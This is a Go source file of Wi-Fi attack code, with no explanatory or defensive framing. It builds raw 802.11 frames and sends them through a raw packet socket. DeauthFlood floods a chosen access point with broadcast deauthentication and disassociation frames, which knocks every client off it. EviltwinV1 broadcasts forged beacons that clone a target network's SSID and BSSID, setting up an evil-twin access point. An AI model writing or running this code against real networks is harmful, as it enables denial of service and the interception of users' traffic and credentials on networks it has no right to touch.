package main

import (
	"fmt"
	"net"
	"os"
	"syscall"
	"time"
)

func buildBeaconFrame(ssid string, bssid []byte, channel int, seq uint16) []byte {
	radiotap := []byte{0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}

	fc := []byte{0x80, 0x00}
	dur := []byte{0x00, 0x00}
	da := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	scVal := (seq & 0xFFF) << 4
	sc := []byte{byte(scVal), byte(scVal >> 8)}

	frame := make([]byte, 0, 200)
	frame = append(frame, radiotap...)
	frame = append(frame, fc...)
	frame = append(frame, dur...)
	frame = append(frame, da...)
	frame = append(frame, bssid...)
	frame = append(frame, bssid...)
	frame = append(frame, sc...)

	ts := time.Now().UnixMicro()
	timestamp := []byte{
		byte(ts), byte(ts >> 8), byte(ts >> 16), byte(ts >> 24),
		byte(ts >> 32), byte(ts >> 40), byte(ts >> 48), byte(ts >> 56),
	}
	beaconInterval := []byte{0x64, 0x00}
	capInfo := []byte{0x04, 0x00}

	frame = append(frame, timestamp...)
	frame = append(frame, beaconInterval...)
	frame = append(frame, capInfo...)

	frame = append(frame, 0x00)
	frame = append(frame, byte(len(ssid)))
	frame = append(frame, []byte(ssid)...)

	frame = append(frame, 0x01)
	rates := []byte{0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24}
	frame = append(frame, byte(len(rates)))
	frame = append(frame, rates...)

	frame = append(frame, 0x03)
	frame = append(frame, 0x01)
	frame = append(frame, byte(channel))

	return frame
}

func buildDeauthFrame(bssid, station []byte, frameType byte) []byte {
	radiotap := []byte{0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	frame := make([]byte, 0, 40)
	frame = append(frame, radiotap...)
	frame = append(frame, frameType, 0x00)
	frame = append(frame, 0x3A, 0x01)
	frame = append(frame, station...)
	frame = append(frame, bssid...)
	frame = append(frame, bssid...)
	frame = append(frame, 0x00, 0x00)
	frame = append(frame, 0x03, 0x00)
	return frame
}

func DeauthFlood(iface, bssidStr string, stop <-chan struct{}) error {
	bssid := mac2bytes(bssidStr)
	broadcast := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}

	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		return fmt.Errorf("deauth socket: %v", err)
	}
	defer syscall.Close(fd)

	ifi, err := net.InterfaceByName(iface)
	if err != nil {
		return fmt.Errorf("deauth iface %s: %v", iface, err)
	}

	addr := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_ALL),
		Ifindex:  ifi.Index,
	}

	if err := syscall.Bind(fd, &addr); err != nil {
		return fmt.Errorf("deauth bind: %v", err)
	}

	deauthFrame := buildDeauthFrame(bssid, broadcast, 0xC0)
	disassocFrame := buildDeauthFrame(bssid, broadcast, 0xA0)

	total := 0
	fmt.Printf("[GO-DEAUTH] Flooding %s (deauth+disassoc)\n", bssidStr)

	for {
		select {
		case <-stop:
			fmt.Printf("\n[GO-DEAUTH] Stopped after %d frames\n", total)
			return nil
		default:
		}

		syscall.Write(fd, deauthFrame)
		total++
		syscall.Write(fd, disassocFrame)
		total++

		if total%2000 == 0 {
			fmt.Printf("\r[GO-DEAUTH] Sent: %d", total)
			os.Stdout.Sync()
		}
	}
}

func EviltwinV1(iface, ssid, bssidStr string, channel int, stop <-chan struct{}) error {
	bssid := mac2bytes(bssidStr)

	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		return fmt.Errorf("raw socket: %v", err)
	}
	defer syscall.Close(fd)

	ifi, err := net.InterfaceByName(iface)
	if err != nil {
		return fmt.Errorf("interface %s: %v", iface, err)
	}

	addr := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_ALL),
		Ifindex:  ifi.Index,
	}

	if err := syscall.Bind(fd, &addr); err != nil {
		return fmt.Errorf("bind: %v", err)
	}

	fmt.Printf("[GO-EVILTWIN-V1] Broadcasting '%s' [%s] on %s ch%d\n", ssid, bssidStr, iface, channel)
	pktCount := 0
	seq := uint16(0)

	for {
		select {
		case <-stop:
			fmt.Printf("\n[GO-EVILTWIN-V1] Stopped after %d packets\n", pktCount)
			return nil
		default:
		}

		frame := buildBeaconFrame(ssid, bssid, channel, seq)
		seq = (seq + 1) & 0xFFF
		n, err := syscall.Write(fd, frame)
		if err == nil && n > 0 {
			pktCount++
		}

		if pktCount%1000 == 0 {
			fmt.Printf("\r[GO-EVILTWIN-V1] Beacon: %d", pktCount)
			os.Stdout.Sync()
		}
	}
}
